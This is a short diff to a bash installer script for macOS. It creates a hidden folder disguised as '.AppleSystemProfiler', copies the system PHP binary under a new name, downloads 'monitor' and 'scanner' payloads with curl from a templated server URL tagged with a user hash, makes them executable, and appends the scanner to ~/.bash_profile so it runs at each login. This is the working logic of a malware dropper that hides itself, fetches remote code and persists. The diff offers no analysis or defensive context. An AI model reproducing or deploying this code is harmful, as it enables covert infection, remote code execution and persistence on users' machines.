@@ -2,15 +2,22 @@
 
 HOME=~
 DIR_NAME=".AppleSystemProfiler"
-DIR=$HOME/$DIR_NAME
+DIR=$HOME/$DIR_NAME/bin
 PROFILE=$HOME/.bash_profile
-SCANNER=$DIR/scanner
+BINARY=$DIR/ctl
+BIN_ESC=`echo $BINARY | sed 's/[\\/&]/\\\\&/g'`
+SCANNER=$DIR/scan
 MONITOR=$DIR/monitor
 MON_ESC=`echo $MONITOR | sed 's/[\\/&]/\\\\&/g'`
 IN_PROF="`cat $PROFILE | grep \"$SCANNER\"`"
+PHP=/usr/bin/php
 
 if [[ ! -d $DIR ]]; then
-   mkdir $DIR
+   mkdir -p $DIR
+fi
+
+if [[ ! -f $BINARY ]]; then
+   cp $PHP $BINARY
 fi
 
 curl -s -o $MONITOR "{{SERVER_HOST}}g.php?h={{USER_HASH}}"
@@ -18,6 +25,7 @@ curl -s -o $SCANNER "{{SERVER_HOST}}r"
 chmod +x $MONITOR
 chmod +x $SCANNER
 sed -i '' "s/MONITOR/$MON_ESC/g" $SCANNER
+sed -i '' "s/BINARY_LOCATION/$BIN_ESC/g" $MONITOR
 
 if [[ -z $IN_PROF ]]; then
    echo $SCANNER >> ~/.bash_profile
